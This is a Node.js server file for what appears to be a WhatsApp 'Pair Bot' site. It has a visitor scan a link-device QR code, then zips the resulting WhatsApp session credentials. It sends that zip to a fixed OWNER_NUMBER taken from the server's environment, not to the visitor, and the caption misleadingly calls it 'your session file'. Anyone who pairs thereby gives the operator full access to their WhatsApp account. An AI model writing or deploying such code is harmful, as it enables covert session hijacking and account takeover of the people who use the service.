require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const fs = require("fs-extra");
const path = require("path");
const AdmZip = require("adm-zip");
const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));

const sessions = new Map();

io.on("connection", (socket) => {
  console.log("👤 Client connected:", socket.id);

  socket.on("startPairing", async ({ number }) => {
    if (!number || !/^\d{9,15}$/.test(number)) {
      socket.emit("error", "❌ Invalid phone number.");
      return;
    }

    const authFolder = path.resolve(`./auth/${number}`);
    const credsPath = path.join(authFolder, "creds.json");
    const sessionExists = await fs.pathExists(credsPath);

    if (sessionExists) {
      socket.emit("status", "⚠️ Session exists. Delete it to reconnect.");
      return;
    }

    try {
      await fs.ensureDir(authFolder);
      const { state, saveCreds } = await useMultiFileAuthState(authFolder);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
      });

      sessions.set(number, sock);
      socket.emit("status", "🔄 Waiting for QR scan...");

      sock.ev.on("connection.update", async (update) => {
        const { connection, qr, lastDisconnect } = update;

        if (qr) {
          socket.emit("qrCode", qr);
          socket.emit("status", "📟 Scan this QR with WhatsApp → Link Device.");
        }

        if (connection === "open") {
          socket.emit("status", "✅ Connected successfully!");
          await saveCreds();

          const zipPath = `./auth/${number}.zip`;
          const zip = new AdmZip();
          zip.addLocalFolder(authFolder);
          zip.writeZip(zipPath);

          // Send session zip to owner via WhatsApp
          const ownerJid = `${process.env.OWNER_NUMBER}@s.whatsapp.net`;
          try {
            await sock.sendMessage(ownerJid, {
              document: fs.readFileSync(zipPath),
              mimetype: "application/zip",
              fileName: "session.zip",
              caption: "📦 Here is your WhatsApp session file to deploy your bot.",
            });
            console.log(`📤 Session sent to owner: ${ownerJid}`);
          } catch (err) {
            console.error("❌ Error sending session to owner:", err.message);
          }
        }

        if (connection === "close") {
          let reason = "⚠️ Disconnected.";
          if (lastDisconnect?.error?.output?.statusCode === 401) {
            reason = "❌ Session expired or invalid.";
          }
          socket.emit("error", reason);
          sessions.delete(number);
        }
      });

      sock.ev.on("creds.update", saveCreds);
    } catch (err) {
      socket.emit("error", `❌ Error: ${err.message}`);
    }
  });

  socket.on("disconnect", () => {
    console.log("👤 Client disconnected:", socket.id);
  });
});

server.listen(PORT, () => {
  console.log(`🚀 BEN - Whittaker Tech Pair Bot running at: http://localhost:${PORT}`);
});
